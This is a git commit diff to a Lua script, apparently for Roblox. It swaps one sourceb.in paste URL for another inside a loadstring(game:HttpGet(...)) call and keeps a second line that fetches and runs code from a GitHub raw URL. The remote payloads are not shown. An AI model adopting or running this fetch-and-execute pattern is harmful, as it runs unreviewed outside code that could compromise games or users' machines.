f1dc28823abf10d40aee9722dfa19916fed78f9d
Mark <jaimepersonal46@gmail.com>
2026-05-06 15:56:39 +0200

    Update Script.lua

--- Script.lua
+++ Script.lua
@@ -1,7 +1,7 @@
 -- Please Any Issues Report To Me With SS of the error --
 local fenv = getfenv()
 task.spawn(function()
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/frFvztQ8JR/0"))()
+    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/HbaOHnNn0R/0", true))()
 end)
 loadstring(game:HttpGet("https://raw.githubusercontent.com/MarkRuiz00/RobloxUtils/refs/heads/main/RobloxStudio"))()
 
